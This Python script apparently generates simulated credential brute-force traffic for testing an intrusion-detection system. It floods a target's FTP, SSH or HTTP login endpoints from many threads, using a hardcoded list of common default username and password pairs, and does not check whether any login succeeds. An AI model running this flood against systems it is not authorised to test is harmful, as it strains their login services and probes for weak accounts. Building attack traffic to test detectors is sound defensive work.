#!/usr/bin/env python3
"""
Chakravyuh AI: High-Frequency Credential Stuffing & Brute-Force Attack Simulator
Target MITRE Class: Recon/BruteForce (Class 1: FTP-BruteForce / SSH-Bruteforce)
Simulates rapid dictionary credential attacks and authentication probes.
"""

import socket
import sys
import time
import argparse
import threading
from concurrent.futures import ThreadPoolExecutor

stop_event = threading.Event()

# Realistic credential wordlist sample for simulation
CREDENTIAL_PAIRS = [
    ("admin", "admin123"),
    ("root", "toor"),
    ("user", "password"),
    ("operator", "operator2026"),
    ("guest", "guest1234"),
    ("service", "service@123"),
    ("test", "test1234"),
    ("dbadmin", "postgres2026"),
    ("cisco", "cisco123"),
    ("manager", "manager@pass"),
    ("supervisor", "super#2026"),
    ("sysadmin", "qwerty123456")
]

def brute_force_worker(target_ip: str, target_port: int, worker_id: int):
    """Executes high-frequency authentication handshake attempts."""
    cred_idx = worker_id % len(CREDENTIAL_PAIRS)
    
    while not stop_event.is_set():
        user, pwd = CREDENTIAL_PAIRS[cred_idx % len(CREDENTIAL_PAIRS)]
        cred_idx += 1
        
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.6)
            s.connect((target_ip, target_port))
            
            # Send protocol authentication probe depending on port
            if target_port == 21:  # FTP
                s.send(f"USER {user}\r\nPASS {pwd}\r\n".encode())
            elif target_port == 22:  # SSH Banner probe
                s.send(b"SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6\r\n")
            else:  # HTTP Basic Auth / API login probe
                payload = (
                    f"POST /api/login HTTP/1.1\r\n"
                    f"Host: {target_ip}\r\n"
                    f"Content-Type: application/json\r\n"
                    f"User-Agent: Chakravyuh-BruteForce/2.0\r\n"
                    f"Content-Length: {len(user) + len(pwd) + 25}\r\n\r\n"
                    f'{{"user":"{user}","pass":"{pwd}"}}'
                ).encode()
                s.send(payload)
                
            s.close()
        except Exception:
            pass
            
        time.sleep(0.02)

def start_brute_force(target_ip: str, target_port: int = 8000, threads: int = 16, duration: int = 10):
    print("=" * 55)
    print(f"[ATTACK SIMULATION] Launching Credential Brute-Force on {target_ip}:{target_port}")
    print(f"Target MITRE Class: Recon/BruteForce (Class 1)")
    print(f"Workers: {threads} | Duration: {duration}s | Auth Dictionary: {len(CREDENTIAL_PAIRS)} pairs")
    print("=" * 55)

    stop_event.clear()
    thread_pool = []
    
    for i in range(threads):
        t = threading.Thread(target=brute_force_worker, args=(target_ip, target_port, i))
        t.daemon = True
        t.start()
        thread_pool.append(t)

    try:
        for remaining in range(duration, 0, -1):
            sys.stdout.write(f"\r[⚡] Brute-force surge underway... {remaining}s remaining (Press Ctrl+C to abort) ")
            sys.stdout.flush()
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nAborted by user.")

    stop_event.set()
    print("\n[✓] Brute-force simulation finished.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Chakravyuh AI: Credential Stuffing & Brute-Force Simulator")
    parser.add_argument("target", nargs="?", default="127.0.0.1", help="Target Defense IP (default: 127.0.0.1)")
    parser.add_argument("port", nargs="?", type=int, default=8000, help="Target Port (default: 8000)")
    parser.add_argument("--workers", "-w", type=int, default=16, help="Concurrent workers (default: 16)")
    parser.add_argument("--duration", "-d", type=int, default=10, help="Duration in seconds (default: 10)")
    
    args = parser.parse_args()
    start_brute_force(args.target, args.port, args.workers, args.duration)
